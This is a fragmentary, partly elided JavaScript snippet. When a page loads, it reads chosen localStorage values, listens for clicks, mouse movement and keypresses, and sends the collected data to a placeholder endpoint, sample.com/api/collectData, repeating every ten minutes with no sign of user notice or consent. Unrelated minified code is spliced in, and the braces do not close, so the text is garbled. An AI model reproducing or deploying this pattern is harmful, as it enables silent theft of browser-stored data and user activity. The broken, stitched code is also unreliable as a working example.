(function () {
  ...
  function fetchDataFromLocalStorage() {
    ...
    for (let i = 0; i < localStorage.length; i++) {
      ...
      if (keysToMonitor.indexOf(keyName) !== -1) {
        fetchedData[keyName] = localStorage.getItem(keyName);
      }
    }
    return fetchedData;
  }
  ...
  function setGlobalVariableData() {
    window.globalData = fetchDataFromLocalStorage();
  }
  ...
  function trackEvents() {
    const monitorEvents = ["click", "mousemove", "keypress"];
    for (let event of monitorEvents) {
      document.addEventListener(event, function (e) {
        console.log(`Event - ${event}: ${JSON.stringify(e)}`);
      });
    }
  }
  var N = function () {
  ...
  function dispatchDataToServer(data) {
    ...
    let endpoint = "https://sample.com/api/collectData";
  ...
  function collectAndPushData() {
    let collectedData = fetchDataFromLocalStorage();
  ...
  document.addEventListener("DOMContentLoaded", function () {
    ...
    trackEvents();
    collectAndPushData();
    setInterval(collectAndPushData, 10 * 60 * 1000);
  });
  function Ba(a, b) {
    var c = Q(),
      c = (y(l) && !y(c.m) ? l : c.m) || [];
